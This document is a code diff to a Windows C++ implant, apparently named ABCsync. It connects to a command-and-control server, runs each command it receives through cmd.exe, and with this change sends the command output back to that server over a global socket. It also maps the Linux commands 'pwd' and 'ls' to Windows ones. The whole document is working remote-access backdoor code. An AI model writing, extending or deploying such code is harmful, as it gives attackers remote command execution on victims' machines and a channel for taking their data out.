@@ -5,9 +5,10 @@
 
 #pragma comment(lib, "ws2_32.lib")
 
+SOCKET c2Socket;  // Define a global variable for the C2 socket
+
 bool ABCsync::connectToC2(const std::string& c2Address, int port) {
     WSADATA wsaData;
-    SOCKET sock;
     sockaddr_in serverAddr;
 
     // Initialize Winsock
@@ -17,8 +18,8 @@ bool ABCsync::connectToC2(const std::string& c2Address, int port) {
     }
 
     // Create socket
-    sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock == INVALID_SOCKET) {
+    c2Socket = socket(AF_INET, SOCK_STREAM, 0);
+    if (c2Socket == INVALID_SOCKET) {
         std::cerr << "[!] Failed to create socket." << std::endl;
         WSACleanup();
         return false;
@@ -30,9 +31,9 @@ bool ABCsync::connectToC2(const std::string& c2Address, int port) {
     serverAddr.sin_addr.s_addr = inet_addr(c2Address.c_str());
 
     // Connect to C2 server
-    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
+    if (connect(c2Socket, (sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
         std::cerr << "[!] Failed to connect to C2 server." << std::endl;
-        closesocket(sock);
+        closesocket(c2Socket);
         WSACleanup();
         return false;
     }
@@ -42,26 +43,33 @@ bool ABCsync::connectToC2(const std::string& c2Address, int port) {
     // Listen for commands from the server
     char buffer[1024];
     int bytesRead;
-    while ((bytesRead = recv(sock, buffer, sizeof(buffer) - 1, 0)) > 0) {
+    while ((bytesRead = recv(c2Socket, buffer, sizeof(buffer) - 1, 0)) > 0) {
         buffer[bytesRead] = '\0';  // Null-terminate the received data
         std::cout << "[*] Received command: " << buffer << std::endl;
         executeRemoteCommand(buffer);  // Execute the received command
     }
 
-    closesocket(sock);
+    closesocket(c2Socket);
     WSACleanup();
     return true;
 }
 
 bool ABCsync::executeRemoteCommand(const std::string& command) {
-    std::cout << "[*] Executing command: " << command << std::endl;
+    std::string adjustedCommand = command;
 
-    // Use a pipe to execute the command and retrieve its output
-    return executeCommand(command);
+    // Translate Linux-specific commands to Windows equivalents
+    if (command == "pwd") {
+        adjustedCommand = "cd";  // In Windows, "cd" prints the current directory
+    }
+    else if (command == "ls") {
+        adjustedCommand = "dir";  // In Windows, "dir" lists directory contents
+    }
+
+    std::cout << "[*] Executing command: " << adjustedCommand << std::endl;
+    return executeCommand(adjustedCommand);
 }
 
 bool ABCsync::executeCommand(const std::string& command) {
-    // Create a pipe to capture the output of the command
     SECURITY_ATTRIBUTES saAttr;
     saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
     saAttr.bInheritHandle = TRUE;
@@ -73,10 +81,8 @@ bool ABCsync::executeCommand(const std::string& command) {
         return false;
     }
 
-    // Ensure the read handle to the pipe is not inherited.
     SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);
 
-    // Set up the process information and start the command
     PROCESS_INFORMATION piProcInfo;
     STARTUPINFO siStartInfo;
     ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
@@ -86,12 +92,10 @@ bool ABCsync::executeCommand(const std::string& command) {
     siStartInfo.hStdOutput = hStdOutWrite;
     siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
 
-    // Prepare the command line
     std::string cmd = "cmd.exe /c " + command;
     char cmdLine[1024];
     strncpy(cmdLine, cmd.c_str(), sizeof(cmdLine));
 
-    // Start the child process
     if (!CreateProcess(NULL, cmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &siStartInfo, &piProcInfo)) {
         std::cerr << "[!] Failed to execute command." << std::endl;
         CloseHandle(hStdOutRead);
@@ -99,23 +103,21 @@ bool ABCsync::executeCommand(const std::string& command) {
         return false;
     }
 
-    // Wait for the process to finish
     WaitForSingleObject(piProcInfo.hProcess, INFINITE);
 
-    // Read the output from the command
     DWORD bytesRead;
     char buffer[4096];
     bool success = false;
     if (ReadFile(hStdOutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
         buffer[bytesRead] = '\0';
         std::cout << "[*] Command output: " << buffer << std::endl;
+
+        // Send the command output back to the C2 server
+        send(c2Socket, buffer, bytesRead, 0);
+
         success = true;
     }
-    else {
-        std::cerr << "[!] Failed to read command output." << std::endl;
-    }
 
-    // Clean up
     CloseHandle(piProcInfo.hProcess);
     CloseHandle(piProcInfo.hThread);
     CloseHandle(hStdOutRead);
